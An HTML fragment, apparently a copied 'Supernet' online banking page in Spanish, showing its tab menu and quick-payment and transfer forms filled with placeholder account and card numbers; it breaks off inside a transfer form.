    div.mainLogin {
        background: #FFF; /*#F4F5F9;*/
        border: 1px solid #D6D7DB;
        font-family: Verdana;
        font-size: 12px;
        color: black;
    }
    /********rodrigogarcia******/

    table.confirmDataFixed {
        table-layout : fixed;
    }
</style>
<div id="jbscreen" class="layer" style="position: absolute; left: 0px; top: 0px; width: 1280px; height: 800px; z-index: 10000; display: block;"></div>
<div id="jbscreenLoading" class="layer" style="position: absolute; left: 0px; top: 0px; width: 1280px; height: 800px; display: none; z-index: 10000;"></div>
<div id="jbscreenAlert" class="layer" style="position: absolute; left: 0px; top: 0px; width: 1280px; height: 800px; z-index: 10000;"></div>
<table id="tbl" style="position:relative;left:0px;top:0px;" align="center">
    <tbody>
    <tr id="i3">
        <td id="tblspnt" align="center" style="width: 1003px;">

            <table id="tbl" style="position:relative;left:0px;top:0px;">
                <tbody>
                <tr id="i4">
                    <td id="tblspnt_" style="width: 1003px;">

                        <div id="i2" style="position: absolute; left: 0px; top: 0px; width: 1003px; height: 655px; display: block;">
                            <div id="divWin" style="position:relative;left:0px;top:0px;width:500;height:500;display:NONE;z-index:2000;"></div>
                            <div id="jbscreen" class="layer" style="position:absolute;left:0px;top:0px;width:1006;height:767;z-index:10000;"></div>
                            <div id="jbscreenAlert" class="layer" style="position:absolute;left:0px;top:0px;width:1006;height:767;z-index:10000;"></div>
                            <div id="jbscreenLoading" class="layer" style="position:absolute;left:0px;top:0px;width:1006;height:767;display:NONE;z-index:10000;"></div>
                            <table id="tbl" style="position:relative;left:0px;top:0px;" align="center">
                                <tbody>
                                <tr id="i3">
                                    <td id="tblspnt" align="center">

                                        <table id="tbl" style="position:relative;left:0px;top:0px;">
                                            <tbody>
                                            <tr id="i4">
                                                <td id="tblspnt_">

                                                    <div id="spnt" style="position: relative; left: 0px; top: 0px; width: 1003px; height: 732px; z-index: 1;">
                                                        <div id="spnt.header" class="ieEncabezado" style="position:absolute;left:0px;top:0px;width:1003;height:85;background-color:#5a5a5a;overflow:hidden;"><img id="headerImage" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/defHeader.jpg" border="0" height="85" width="1003" imgname="defHeader"><img id="i69" style="position:absolute;left:687px;top:8px;cursor: hand;" src="img/blackPoint.gif" border="0" height="5" width="5" imgname="blackPoint">
                                                            <font id="spnt.header.super" class="linkunder ieWhite" style="position:absolute;left:700px;top:4px;font-size:12;">Superlinea</font><img id="i69" style="position:absolute;left:785px;top:8px;cursor: hand;" src="img/blackPoint.gif" border="0" height="5" width="5" imgname="blackPoint">
                                                            <font id="spnt.header.demo" class="linkunder ieWhite" style="position:absolute;left:800px;top:4px;font-size:12;">Demo</font><img id="i69" style="position:absolute;left:869px;top:8px;cursor: hand;" src="img/blackPoint.gif" border="0" height="5" width="5" imgname="blackPoint">
                                                            <font id="spnt.header.logout" class="linkunder ieWhite" style="position:absolute;left:878px;top:4px;font-size:12;">Finalizar Sesión</font>
                                                        </div>
                                                        <div id="spnt.tabctrl" class="ivMenu" style="position:absolute;left:0px;top:55px;width:1003;height:30;">
                                                            <div id="spnt.tabdivs.msdr.tabItem" style="position:absolute;left:21px;top:2px;width:100;height:28;">
                                                                <div id="spnt.tabdivs.msdr.leftTab" class="ieLeftTab" style="position:absolute;left:0px;top:0px;width:16;height:28;">
                                                                    <img id="spnt.tabdivs.msdr.leftTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/leftTabSel.gif" border="0" height="28" width="16" imgname="leftTab"></div>
                                                                <div id="spnt.tabdivs.msdr.tabBody" style="position:absolute;left:15px;top:0px;width:80;height:28;"><img id="spnt.tabdivs.msdr.bodyTabImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/bodyTabSel.gif" border="0" height="100%" width="100%" imgname="bodyTab">
                                                                    <fieldset id="c_spnt.tabdivs.msdr.bodyTabLabel" style="position:absolute;left:0px;top:4px;width:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.tabdivs.msdr.bodyTabLabel" class="bodyTabOff" style="font-size:12;">Mi Supernet</font>
                                                                    </fieldset>
                                                                </div>
                                                                <div id="spnt.tabdivs.msdr.rightTab" class="ieRightTab" style="position:absolute;left:95px;top:0px;width:13;height:28;overflow:hidden;"><img id="spnt.tabdivs.msdr.rightTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/rightTabSel.gif" border="0" height="28" width="13" imgname="rightTab"></div>
                                                            </div>
                                                            <div id="spnt.tabdivs.pgs.tabItem" style="position:absolute;left:120px;top:2px;width:100;height:28;">
                                                                <div id="spnt.tabdivs.pgs.leftTab" class="ieLeftTab" style="position:absolute;left:0px;top:0px;width:16;height:28;"><img id="spnt.tabdivs.pgs.leftTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/leftTab.gif" border="0" height="28" width="16" imgname="leftTab"></div>
                                                                <div id="spnt.tabdivs.pgs.tabBody" style="position:absolute;left:15px;top:0px;width:110;height:28;"><img id="spnt.tabdivs.pgs.bodyTabImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/bodyTab.gif" border="0" height="100%" width="100%" imgname="bodyTab">
                                                                    <fieldset id="c_spnt.tabdivs.pgs.bodyTabLabel" style="position:absolute;left:0px;top:4px;width:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.tabdivs.pgs.bodyTabLabel" class="bodyTab" style="font-size:12;">Pagos y Compras</font>
                                                                    </fieldset>
                                                                </div>
                                                                <div id="spnt.tabdivs.pgs.rightTab" class="ieRightTab" style="position:absolute;left:125px;top:0px;width:13;height:28;overflow:hidden;"><img id="spnt.tabdivs.pgs.rightTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/rightTab.gif" border="0" height="28" width="13" imgname="rightTab"></div>
                                                            </div>
                                                            <div id="spnt.tabdivs.tran.tabItem" style="position:absolute;left:249px;top:2px;width:100;height:28;">
                                                                <div id="spnt.tabdivs.tran.leftTab" class="ieLeftTab" style="position:absolute;left:0px;top:0px;width:16;height:28;"><img id="spnt.tabdivs.tran.leftTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/leftTab.gif" border="0" height="28" width="16" imgname="leftTab"></div>
                                                                <div id="spnt.tabdivs.tran.tabBody" style="position:absolute;left:15px;top:0px;width:90;height:28;"><img id="spnt.tabdivs.tran.bodyTabImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/bodyTab.gif" border="0" height="100%" width="100%" imgname="bodyTab">
                                                                    <fieldset id="c_spnt.tabdivs.tran.bodyTabLabel" style="position:absolute;left:0px;top:4px;width:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.tabdivs.tran.bodyTabLabel" class="bodyTab" style="font-size:12;">Transferencias</font>
                                                                    </fieldset>
                                                                </div>
                                                                <div id="spnt.tabdivs.tran.rightTab" class="ieRightTab" style="position:absolute;left:105px;top:0px;width:13;height:28;overflow:hidden;"><img id="spnt.tabdivs.tran.rightTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/rightTab.gif" border="0" height="28" width="13" imgname="rightTab"></div>
                                                            </div>
                                                            <div id="spnt.tabdivs.inve.tabItem" style="position:absolute;left:358px;top:2px;width:100;height:28;">
                                                                <div id="spnt.tabdivs.inve.leftTab" class="ieLeftTab" style="position:absolute;left:0px;top:0px;width:16;height:28;"><img id="spnt.tabdivs.inve.leftTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/leftTab.gif" border="0" height="28" width="16" imgname="leftTab"></div>
                                                                <div id="spnt.tabdivs.inve.tabBody" style="position:absolute;left:15px;top:0px;width:72;height:28;"><img id="spnt.tabdivs.inve.bodyTabImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/bodyTab.gif" border="0" height="100%" width="100%" imgname="bodyTab">
                                                                    <fieldset id="c_spnt.tabdivs.inve.bodyTabLabel" style="position:absolute;left:0px;top:4px;width:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.tabdivs.inve.bodyTabLabel" class="bodyTab" style="font-size:12;">Inversiones</font>
                                                                    </fieldset>
                                                                </div>
                                                                <div id="spnt.tabdivs.inve.rightTab" class="ieRightTab" style="position:absolute;left:87px;top:0px;width:13;height:28;overflow:hidden;"><img id="spnt.tabdivs.inve.rightTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/rightTab.gif" border="0" height="28" width="13" imgname="rightTab"></div>
                                                            </div>
                                                            <div id="spnt.tabdivs.bpriv.tabItem" style="position:absolute;left:449px;top:2px;width:100;height:28;">
                                                                <div id="spnt.tabdivs.bpriv.leftTab" class="ieLeftTab" style="position:absolute;left:0px;top:0px;width:16;height:28;"><img id="spnt.tabdivs.bpriv.leftTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/leftTab.gif" border="0" height="28" width="16" imgname="leftTab"></div>
                                                                <div id="spnt.tabdivs.bpriv.tabBody" style="position:absolute;left:15px;top:0px;width:100;height:28;"><img id="spnt.tabdivs.bpriv.bodyTabImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/bodyTab.gif" border="0" height="100%" width="100%" imgname="bodyTab">
                                                                    <fieldset id="c_spnt.tabdivs.bpriv.bodyTabLabel" style="position:absolute;left:0px;top:4px;width:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.tabdivs.bpriv.bodyTabLabel" class="bodyTab" style="font-size:12;">Banca Privada</font>
                                                                    </fieldset>
                                                                </div>
                                                                <div id="spnt.tabdivs.bpriv.rightTab" class="ieRightTab" style="position:absolute;left:115px;top:0px;width:13;height:28;overflow:hidden;"><img id="spnt.tabdivs.bpriv.rightTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/rightTab.gif" border="0" height="28" width="13" imgname="rightTab"></div>
                                                            </div>
                                                            <div id="spnt.tabdivs.dire.tabItem" style="position:absolute;left:568px;top:2px;width:100;height:28;">
                                                                <div id="spnt.tabdivs.dire.leftTab" class="ieLeftTab" style="position:absolute;left:0px;top:0px;width:16;height:28;"><img id="spnt.tabdivs.dire.leftTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/leftTab.gif" border="0" height="28" width="16" imgname="leftTab"></div>
                                                                <div id="spnt.tabdivs.dire.tabBody" style="position:absolute;left:15px;top:0px;width:112;height:28;"><img id="spnt.tabdivs.dire.bodyTabImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/bodyTab.gif" border="0" height="100%" width="100%" imgname="bodyTab">
                                                                    <fieldset id="c_spnt.tabdivs.dire.bodyTabLabel" style="position:absolute;left:0px;top:4px;width:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.tabdivs.dire.bodyTabLabel" class="bodyTab" style="font-size:12;">Directorio Supernet</font>
                                                                    </fieldset>
                                                                </div>
                                                                <div id="spnt.tabdivs.dire.rightTab" class="ieRightTab" style="position:absolute;left:127px;top:0px;width:13;height:28;overflow:hidden;"><img id="spnt.tabdivs.dire.rightTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/rightTab.gif" border="0" height="28" width="13" imgname="rightTab"></div>
                                                            </div>
                                                            <div id="spnt.tabdivs.admn.tabItem" style="position:absolute;left:699px;top:2px;width:100;height:28;">
                                                                <div id="spnt.tabdivs.admn.leftTab" class="ieLeftTab" style="position:absolute;left:0px;top:0px;width:16;height:28;"><img id="spnt.tabdivs.admn.leftTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/leftTab.gif" border="0" height="28" width="16" imgname="leftTab"></div>
                                                                <div id="spnt.tabdivs.admn.tabBody" style="position:absolute;left:15px;top:0px;width:100;height:28;"><img id="spnt.tabdivs.admn.bodyTabImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/bodyTab.gif" border="0" height="100%" width="100%" imgname="bodyTab">
                                                                    <fieldset id="c_spnt.tabdivs.admn.bodyTabLabel" style="position:absolute;left:0px;top:4px;width:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.tabdivs.admn.bodyTabLabel" class="bodyTab" style="font-size:12;">Administración</font>
                                                                    </fieldset>
                                                                </div>
                                                                <div id="spnt.tabdivs.admn.rightTab" class="ieRightTab" style="position:absolute;left:115px;top:0px;width:13;height:28;overflow:hidden;"><img id="spnt.tabdivs.admn.rightTabImg" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/rightTab.gif" border="0" height="28" width="13" imgname="rightTab"></div>
                                                            </div>
                                                        </div>
                                                        <div id="spnt.info" class="indraUnderMenu" style="position:absolute;left:1px;top:86px;width:1002;height:45;background-color:000000;">
                                                            <div id="spnt.info.img" style="position:absolute;left:10px;top:2px;width:50;height:40;"></div>
                                                            <font id="spnt.info.bnda" class="ieBanda" style="position: absolute; left: 25px; top: 3px; font-size: 12px; display: none;"><i>Bienvenido,</i></font>
                                                            <font id="spnt.info.nmbr" class="ieNombre" style="position: absolute; left: 100px; top: 3px; font-size: 12px; display: none;"><b></b></font>
                                                            <font id="mainFecha" style="position:absolute;left:680px;top:3px;font-size:11;">19/Jul/2019</font><img id="spnt.info.nvaSnet" class="ieImg ieNvaSnet" style="position:absolute;left:400px;top:7px;cursor: hand;" src="img/nvaSnet.png" border="0" imgname="nvaSnet" onclick="bip.goBip()"><img id="spnt.info.constancias_fiscales" class="ieImg ieConstanciasFiscales" style="position:absolute;left:500px;top:14px;cursor: hand;" src="img/constancias_fiscales.png" border="0" imgname="constancias_fiscales" onclick="ConstanciasFiscales.operaciones.getEjercicioFiscal()"><img id="spnt.info.edocta" class="ieImg ieEdocta" style="position:absolute;left:515px;top:14px;cursor: hand;" src="img/edocta.gif" border="0" imgname="edocta" onclick="EdoCuentaCold.selCuenta.ini()"><a id="edoCuentaLink" class="linkUnder" style="position: absolute; left: 637px; top: 18px; display: none;" href="#" onclick="EdoCuentaCold.selCuenta.ini()">Estados de Cuenta</a>
                                                            <font id="spnt.info.FchUltAcceso" class="ieFechaAcceso" style="position: absolute; left: 25px; top: 22px; font-size: 12px; display: none;">Ultima Fecha de Acceso</font>
                                                            <font id="spnt.info.tiene" class="ieOcultar" style="position: absolute; left: 25px; top: 40px; font-size: 12px; display: none;">Usted Tiene</font>
                                                            <font id="spnt.info.nuevos" class="ieOcultar" style="position: absolute; left: 165px; top: 40px; font-size: 12px; display: none;">Nuevos</font><img id="spnt.info.printimg" class="ieImg ieImprimir" style="position:absolute;left:690px;top:14px;cursor: hand;" src="img/print.gif" border="0" imgname="print" onclick="window.print()"><img id="spnt.info.cdfiimg" class="ieImg ieCfdi" style="position:absolute;left:790px;top:14px;cursor: hand;" src="img/cfdi.gif" border="0" imgname="cfdi" onclick="EdcCFDI.selCuenta.ini()">
                                                            <font id="spnt.info.mensajes" class="linkred ieMensajes" style="position:absolute;left:96px;top:21px;font-size:12;"></font>
                                                        </div>
                                                        <div id="spnt.tabdivs" class="ieTabDivs" style="position:absolute;left:0px;top:148px;width:830;height:600;background-color:FFFFFF;overflow:hidden;">
                                                            <div id="spnt.tabdivs.msdr" class="ieTransparent ieTabMSDR  ieTab" style="position: absolute; left: 0px; top: 0px; width: 830px; height: 722px; background-color: rgb(255, 255, 255); display: block;">
                                                                <div id="spnt.tabdivs.msdr.mvts" style="position:absolute;left:0px;top:0px;width:830;height:722;display:NONE;z-index:20;background-color:FFFFFF;"></div>
                                                                <div id="spnt.tabdivs.msdr.oprp" class="ieOprp" style="position: absolute; left: 0px; top: 0px; width: 212px; height: 584px; z-index: 0; background-color: rgb(255, 255, 255);">
                                                                    <div id="oprp.UtilWnd" class="utilWnd" style="position: relative; left: 0px; top: 0px; width: 212px; height: 584px;">
                                                                        <div id="oprp.UtilPlus" class="title" style="position:relative;left:0px;top:0px;">
                                                                            <table id="oprp.tablePlus" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
                                                                                <tbody>
                                                                                <tr id="oprp.trContainer123">
                                                                                    <td class="oprap" id="oprp.tdContainer123">
                                                                                        <div id="oprp.divContainer123" style="position:relative;left:0px;top:0px;"></div>
                                                                                    </td>
                                                                                </tr>
                                                                                </tbody>
                                                                            </table>
                                                                        </div>
                                                                        <div id="oprp.UtilHeader" class="title" style="position:relative;left:0px;top:0px;height:33;">
                                                                            <table id="oprp.i4" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
                                                                                <tbody>
                                                                                <tr id="oprp.i5" height="28">
                                                                                    <td class="dheader ieImgBack" id="oprp.i6">

                                                                                        <font id="oprp.UtilTitle" class="header" style="position:relative;left:0px;top:0px;">Operaciones Rápidas</font>
                                                                                    </td>
                                                                                    <td class="dheader" id="oprp.i8" align="right">

                                                                                    </td>
                                                                                </tr>
                                                                                </tbody>
                                                                            </table>
                                                                        </div>
                                                                        <div id="oprp.UtilBody" class="utilBody" style="position: relative; left: 0px; top: 0px; height: 545px;">
                                                                            <table id="oprp.Container" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                <tbody>
                                                                                <tr id="oprp.pags001">
                                                                                    <td class="fsiSubtitulo" id="oprp.pags01">
                                                                                        <div id="oprp.pags1" class="oprpLabels" style="position:relative;left:0px;top:0px;width:210;height:13;">
                                                                                            <font id="oprp.i67" class="header2" style="position:absolute;left:9px;top:-2px;">Pagos</font>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.pagosServr">
                                                                                    <td class="oprap" id="oprp.pagoServs">
                                                                                        <div id="oprp.servsCont" style="position:relative;left:0px;top:0px;">
                                                                                            <div id="pgserquick.pagserdiv" style="position:relative;left:0px;top:0px;">
                                                                                                <div id="pgserquick.operation" class="linked" style="position:relative;left:0px;top:0px;width:196;"><img id="pgserquick.mainButt" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/oprPagoServicios.jpg" border="0" imgname="oprPagoServicios">
                                                                                                    <font id="pgserquick.title" class="header3" style="position:absolute;left:22px;top:3px;">Servicios</font><input type="hidden" id="pgserquick.onOpeRapidas" name="pgserquick.onOpeRapidas" value="false">
                                                                                                </div>
                                                                                                <div id="pgserquick.main" class="mainOperation" style="position:relative;left:0px;top:0px;width:193;height:264;display:NONE;border-style:solid;">
                                                                                                    <div id="c_pgserquick.deCuenta" name="c_pgserquick.deCuenta" style="position:absolute;left:10px;top:28px;display:inline"><select style="position:relative;left:0px;top:0px;width:171;" onblur="SKT()" onkeypress="return SKP(event);" id="pgserquick.deCuenta" name="pgserquick.deCuenta" l="">
                                                                                                            <option value="0">De la cuenta</option>
                                                                                                            <option value="undefined" selected=""></option>
                                                                                                            <option value="undefined" selected=""></option>
                                                                                                            <option value="undefined" selected=""></option>
                                                                                                        </select></div>
                                                                                                    <div id="pgserquick.ser" style="position:absolute;left:10px;top:58px;"></div>
                                                                                                    <div id="c_pgserquick.referencia" name="c_pgserquick.referencia" class="size" style="position:absolute;left:10px;top:108px;border-width:0;"><input type="text" autocomplete="off" class="size" id="pgserquick.referencia" name="reference" size="18" maxlength="40" t="0" onfocus="VLF(this)" onblur="" value="Referencia"></div>
                                                                                                    <div id="pgserquick.innerser" style="position:absolute;left:0px;top:0px;">
                                                                                                        <fieldset id="c_pgserquick.referenciaVal" style="position:absolute;left:11px;top:130px;width:150;height:15;display:inline;border-width:0;">
                                                                                                            <font id="pgserquick.referenciaVal" class="helperLabel" style="font-size:11;"></font>
                                                                                                        </fieldset>
                                                                                                        <fieldset id="c_pgserquick.referenciaVal2" style="position:absolute;left:11px;top:145px;width:150;height:15;display:inline;border-width:0;">
                                                                                                            <font id="pgserquick.referenciaVal2" class="helperLabel" style="font-size:11;"></font>
                                                                                                        </fieldset>
                                                                                                    </div>
                                                                                                    <div id="c_pgserquick.importe" name="c_pgserquick.importe" class="size" style="position:absolute;left:10px;top:158px;border-width:0;"><input type="text" autocomplete="off" class="size" id="pgserquick.importe" name="pgserquick.importe" size="13" maxlength="13" t="0" onfocus="VLF(this)" onblur="VLB(this);if((UD(this,'v')!=this.value&amp;&amp;this.V)||UD(this,'dc')){UDS(this,'dc',F);undefined}"></div>
                                                                                                    <table id="c_pgserquick.fecha" name="c_pgserquick.fecha" style="position:absolute;left:11px;top:207px;display:inline" class="size">
                                                                                                        <tbody>
                                                                                                        <tr>
                                                                                                            <td nowrap=""></td>
                                                                                                            <td nowrap="">
                                                                                                                <fieldset style="position:absolute;left:0px;top:0px;display:inline;border-width:0;"><input id="pgserquick.fecha" name="pgserquick.fecha" class="size" readonly="" style="position:relative;top:-5px;" size="10" maxlength="11" l="" t="5" onfocus="VLF(this)" onblur="" '=""><img style="position:relative;left:5px;cursor:pointer" onclick="CCD(' pgserquick.fecha')" src="jackbe/img/cal.gif"></fieldset>
                                                                                                            </td>
                                                                                                        </tr>
                                                                                                        </tbody>
                                                                                                    </table><button id="pgserquick.Pagar" name="enter" class="accionBtn" value="Pagar" style="position:absolute;left:122px;top:231px;width:63;height:22;" type="button"><u></u>Pagar</button>

                                                                                                    <fieldset id="c_pgserquick.desServicio" style="position:absolute;left:9px;top:80px;width:170;height:29;display:inline;border-width:0;">
                                                                                                        <font id="pgserquick.desServicio" class="helperLabel" style="font-size:11;"></font>
                                                                                                    </fieldset>
                                                                                                    <font id="pgserquick.signoPesos" style="position:absolute;left:1px;top:157px;font-size:14;">$</font>
                                                                                                    <div id="pgserquick.pser.header" class="ieSubHeader" style="position:relative;left:0px;top:0px;width:194;height:22;background-color:red;">
                                                                                                        <font id="pgserquick.title" class="header4" style="position:absolute;left:22px;top:3px;">Pagar servicios</font><img id="pgserquick.arrow" style="position:absolute;left:9px;top:0px;cursor: hand;" src="img/flecha.gif" border="0" imgname="flecha"><img id="pgserquick.question" class="linked" style="position:absolute;left:170px;top:2px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                                                                                                    </div><img id="pgserquick.question2" class="linked" style="position:absolute;left:136px;top:109px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                                                                                                </div>
                                                                                            </div>
                                                                                            <div id="pgserquick.divTranOC" style="position:absolute;left:0px;top:0px;width:0;height:0;display:NONE;">
                                                                                                <div id="c_pgserquick.Comision" name="c_pgserquick.Comision" style="position:absolute;left:0px;top:0px;border-width:0;"><input type="text" autocomplete="off" id="pgserquick.Comision" name="i300" readonly="" size="10" maxlength="10" t="0" onfocus="VLF(this)" onblur=""></div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.pagoTdc">
                                                                                    <td class="oprap" id="oprp.pagoTdcr">
                                                                                        <div id="oprp.tdcCont" style="position:relative;left:0px;top:0px;">
                                                                                            <div id="pgtarquick.pagotdcdiv" class="linked" style="position:relative;left:0px;top:0px;width:196;">
                                                                                                <div id="pgtarquick.operation" class="linked" style="position:relative;left:0px;top:0px;width:196;"><img id="pgtarquick.mainButt" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/oprPagoTDC.jpg" border="0" imgname="oprPagoTDC">
                                                                                                    <font id="pgtarquick.title" class="header3" style="position:absolute;left:22px;top:3px;">Tarjeta de Crédito</font>
                                                                                                </div>
                                                                                                <div id="pgtarquick.main" class="mainOperation" style="position: relative; left: 0px; top: 0px; width: 193px; height: 214px; border-style: solid; display: none;">
                                                                                                    <div id="c_pgtarquick.tipo" name="c_pgtarquick.tipo" style="position:absolute;left:10px;top:28px;display:inline"><select style="position:relative;left:0px;top:0px;width:171;" onblur="SKT()" onkeypress="return SKP(event);" id="pgtarquick.tipo" name="pgtarquick.tipo" l="">
                                                                                                            <option value="0">Tipo</option>
                                                                                                            <option value="1">Tarjetas propias</option>
                                                                                                            <option value="2">Tarjetas de terceros</option>
                                                                                                            <option value="3">Tarjetas de terceros Interbancarias</option>
                                                                                                        </select></div>
                                                                                                    <div id="c_pgtarquick.deCuenta" name="c_pgtarquick.deCuenta" style="position:absolute;left:10px;top:54px;display:inline"><select style="position:relative;left:0px;top:0px;width:171;" onblur="SKT()" onkeypress="return SKP(event);" id="pgtarquick.deCuenta" name="pgtarquick.deCuenta" l="">
                                                                                                            <option value="0">De la cuenta</option>
                                                                                                            <option value="11111111111">11111111111</option>
                                                                                                            <option value="22222222222">22222222222</option>
                                                                                                            <option value="33333333333">33333333333</option>
                                                                                                        </select></div>
                                                                                                    <div id="c_pgtarquick.tarjeta" name="c_pgtarquick.tarjeta" style="position:absolute;left:10px;top:80px;display:inline"><select style="position:relative;left:0px;top:0px;width:171;" onblur="SKT()" onkeypress="return SKP(event);" id="pgtarquick.tarjeta" name="pgtarquick.tarjeta" l="">
                                                                                                            <option value="0">Tarjeta</option>
                                                                                                            <option value="1234123412341234">1234123412341234</option>
                                                                                                            <option value="1111222233334444">1111222233334444</option>
                                                                                                        </select></div>
                                                                                                    <div id="c_pgtarquick.referencia" name="c_pgtarquick.referencia" class="size" style="position:absolute;left:10px;top:105px;border-width:0;"><input type="text" autocomplete="off" class="size" id="pgtarquick.referencia" name="pgtarquick.referencia" size="20" maxlength="30" t="0" onfocus="VLF(this)" onblur="" value="Concepto"></div>
                                                                                                    <font id="pgtarquick.signoPesos" style="position:absolute;left:1px;top:130px;font-size:14;">$</font>
                                                                                                    <div id="c_pgtarquick.importe" name="c_pgtarquick.importe" class="size" style="position:absolute;left:10px;top:129px;border-width:0;"><input type="text" autocomplete="off" class="size" id="pgtarquick.importe" name="pgtarquick.importe" size="10" t="0" onfocus="VLF(this)" onblur="" value="Importe"></div>
                                                                                                    <table id="c_pgtarquick.fecha" name="c_pgtarquick.fecha" style="position:absolute;left:11px;top:154px;display:inline" class="size">
                                                                                                        <tbody>
                                                                                                        <tr>
                                                                                                            <td nowrap=""></td>
                                                                                                            <td nowrap="">
                                                                                                                <fieldset style="position:absolute;left:0px;top:0px;display:inline;border-width:0;"><input id="pgtarquick.fecha" name="pgtarquick.fecha" class="size" readonly="" style="position:relative;top:-5px;" size="10" maxlength="11" l="" t="5" onfocus="VLF(this)" onblur="" '=""><img style="position:relative;left:5px;cursor:pointer" onclick="CCD(' pgtarquick.fecha')" src="jackbe/img/cal.gif"></fieldset>
                                                                                                            </td>
                                                                                                        </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                    <div id="pgtarquick.pser.header" class="ieSubHeader" style="position:relative;left:0px;top:0px;width:194;height:22;background-color:red;">
                                                                                                        <font id="pgtarquick.title" class="header4" style="position:absolute;left:22px;top:3px;">Pagar tarjeta de crédito</font><img id="pgtarquick.arrow" style="position:absolute;left:9px;top:0px;cursor: hand;" src="img/flecha.gif" border="0" imgname="flecha"><img id="pgtarquick.question" class="linked" style="position:absolute;left:170px;top:2px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                                                                                                    </div><img id="pgtarquick.question2" class="linked" style="position:absolute;left:150px;top:105px;cursor: hand;" src="img/ayuda2.gif" border="0" imgname="ayuda2"><button id="pgtarquick.pagar" name="enter" class="accionBtn" value="Pagar" style="position:absolute;left:123px;top:181px;width:63;height:22;" type="button"><u></u>Pagar</button>
                                                                                                    <a id="pgtarquick.add" class="item" style="position:absolute;left:12px;top:186px;" href="#" onclick="AdminCuentas.onAltaTrjts();">Agregar tarjeta</a>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.trans001">
                                                                                    <td class="fsiSubtitulo" id="oprp.transl01">
                                                                                        <div id="oprp.trans1" class="oprpLabels" style="position:relative;left:0px;top:0px;width:210;height:13;">
                                                                                            <font id="oprp.i67" class="header2" style="position:absolute;left:9px;top:-2px;">Transferencias</font>
                                                                                            <div id="oprp.i83" class="spnt-sombra" style="position:absolute;left:1px;top:-2px;width:208;height:4;"></div>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.transr">
                                                                                    <td class="oprap" id="oprp.trans">
                                                                                        <div id="oprp.transCont" style="position:relative;left:0px;top:0px;">
                                                                                            <div id="tranquick.transDIIV" class="linked" style="position:relative;left:0px;top:0px;width:196;">
                                                                                                <div id="tranquick.operation" class="linked" style="position:relative;left:0px;top:0px;width:196;"><img id="tranquick.mainButt" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/oprTransferencias.jpg" border="0" imgname="oprTransferencias">
                                                                                                    <font id="tranquick.title" class="header3" style="position:absolute;left:22px;top:3px;">Transferir fondos</font>
                                                                                                </div>
                                                                                                <div id="tranquick.main" class="mainOperation scrollOpRap" style="position: relative; left: 0px; top: 0px; width: 196px; height: 205px; border-style: solid; display: none;">
                                                                                                    <div id="tranquick.header" class="ieSubHeader" style="position:absolute;left:0px;top:0px;width:195;height:22;background-color:red;">
                                                                                                        <font id="tranquick.title" class="header4" style="position:absolute;left:22px;top:3px;">Transferir fondos</font><img id="tranquick.arrow" style="position:absolute;left:9px;top:0px;cursor: hand;" src="img/flecha.gif" border="0" imgname="flecha"><img id="tranquick.question" class="linked" style="position:absolute;left:170px;top:2px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                                                                                                    </div>
                                                                                                    <div id="tranquick.t1" style="position:relative;left:0px;top:0px;width:100;height:100;">
                                                                                                        <div id="c_tranquick.tipo" name="c_tranquick.tipo" style="position:absolute;left:10px;top:28px;display:inline"><select style="position:relative;left:0px;top:0px;width:171;" onblur="SKT()" onkeypress="return SKP(event);" id="tranquick.tipo" name="tranquick.tipo" l="">
                                                                                                                <option value="0">Tipo</option>
                                                                                                                <option value="1">Cuentas propias</option>
                                                                                                                <option value="2">Terceros</option>
                                                                                                                <option value="3">Interbancarias</option>
                                                                                                            </select></div>
                                                                                                        <div id="c_tranquick.deCuenta" name="c_tranquick.deCuenta" style="position:absolute;left:10px;top:54px;display:inline"><select style="position:relative;left:0px;top:0px;width:171;" onblur="SKT()" onkeypress="return SKP(event);" id="tranquick.deCuenta" name="tranquick.deCuenta" l="">
                                                                                                                <option value="0">De la cuenta</option>
